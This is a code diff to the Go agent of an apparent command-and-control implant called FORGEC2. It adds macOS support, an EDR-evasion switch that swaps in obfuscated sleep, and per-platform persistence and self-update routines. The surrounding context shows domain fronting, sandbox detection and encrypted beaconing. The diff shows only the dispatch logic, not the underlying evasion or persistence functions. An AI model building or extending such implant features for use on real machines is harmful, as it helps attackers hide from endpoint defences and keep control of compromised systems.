@@ -1,5 +1,5 @@
-//go:build linux || windows
-// +build linux windows
+//go:build linux || windows || darwin
+// +build linux windows darwin
 
 package main
 
@@ -59,6 +59,7 @@ var (
 	DomainFront      string = ""      // Domain fronting: override HTTP Host header ("" = disabled)
 	ContentLengthJitter int = 0       // Max random padding bytes for HTTP body (0=disabled)
 	ExpiryDateStr    string = ""      // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
+	EvasionStr       string = "false"  // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
 )
 
 // Parsed versions (populated in init)
@@ -71,12 +72,13 @@ var (
 	BeaconURI     string
 	BeaconMethod  string
 	ListenerID    uint
+	evasionEnabled bool
 )
 
 var beaconCipher *streamCipher // beacon payload encryption (nil = disabled)
 var inSandbox bool              // set by sandbox detection at startup
 
-const AgentVersion = "1.2.0" // bump on every release
+const AgentVersion = "2.1.0" // bump on every release
 
 // Platform-specific implementations (screenshots, persistence, sysproc attrs) are in
 // agent_windows.go and agent_linux.go selected by build tags.
@@ -231,6 +233,11 @@ func init() {
 		ListenerID = uint(id)
 	}
 
+	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
+	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
+		evasionEnabled = true
+	}
+
 	// Initialize beacon payload cipher
 	if CryptoKeyStr != "" {
 		key, err := hex.DecodeString(CryptoKeyStr)
@@ -324,6 +331,10 @@ func sleepWithJitter() {
 	// If Sleep Mask is initialized, use encrypted sleep
 	if sleepMaskActive {
 		sleepWithMask(base + variation)
+		return
+	}
+	if evasionEnabled {
+		sleepObfuscated(base + variation)
 		return
 	}
 	time.Sleep(base + variation)
@@ -812,14 +823,17 @@ func takeScreenshotJPEG(quality int) ([]byte, error) {
 }
 
 func addPersistence() {
-	// implemented in platform files (full for win, stub for linux)
-	if runtime.GOOS == "windows" {
+	switch runtime.GOOS {
+	case "windows":
 		addPersistenceWindows()
-		return
-	}
-	// Linux stub
-	if Debug {
-		fmt.Printf("[*] Persistence stub on Linux\n")
+	case "linux":
+		addPersistenceLinux()
+	case "darwin":
+		addPersistenceDarwin()
+	default:
+		if Debug {
+			fmt.Printf("[*] Persistence not implemented for %s\n", runtime.GOOS)
+		}
 	}
 }
 
@@ -1403,10 +1417,14 @@ func selfUpdate(url string) string {
 	}
 
 	// Create wrapper script to replace and restart
-	if runtime.GOOS == "windows" {
+	switch runtime.GOOS {
+	case "windows":
 		return selfUpdateWindows(exe, tmpPath)
+	case "darwin":
+		return selfUpdateDarwin(exe, tmpPath)
+	default:
+		return selfUpdateLinux(exe, tmpPath)
 	}
-	return selfUpdateLinux(exe, tmpPath)
 }
 
 // readFileContent returns raw bytes of a file (for "read" task)
